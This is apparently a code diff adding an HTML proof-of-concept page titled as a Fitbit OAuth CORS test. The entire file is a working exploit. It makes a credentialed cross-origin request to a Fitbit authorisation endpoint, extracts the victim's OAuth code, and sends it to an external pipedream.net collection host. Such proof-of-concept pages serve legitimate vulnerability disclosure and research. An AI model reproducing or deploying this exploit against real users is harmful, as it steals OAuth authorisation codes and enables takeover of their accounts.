@@ -1,0 +1,38 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <title>Fitbit OAuth CORS PoC</title>
+</head>
+<body>
+  <h1>Testing CORS Misconfiguration</h1>
+  <button onclick="exploit()">Get Fitbit Code</button>
+
+  <script>
+    function exploit() {
+      fetch("https://strava.fitbit.com/auth/fitbit?response_type=code&client_id=23QPQJ&redirect_uri=https%3A%2F%2Faccounts.fitbit.com%2Fclienthandler&scope=activity%20profile", {
+        method: "GET",
+        credentials: "include",
+        mode: "cors"
+      })
+      .then(res => res.text())
+      .then(html => {
+        const code = html.match(/code=([a-zA-Z0-9_\-]+)/);
+        if (code) {
+          fetch("https://eoqb3e0qi0vy2sc.m.pipedream.net", {
+            method: "POST",
+            body: JSON.stringify({ oauth_code: code[1] }),
+            headers: { "Content-Type": "application/json" }
+          });
+          alert("✅ OAuth code captured: " + code[1]);
+        } else {
+          alert("❌ OAuth code not found");
+        }
+      })
+      .catch(err => {
+        alert("❌ Error: " + err.message);
+      });
+    }
+  </script>
+</body>
+</html>
+
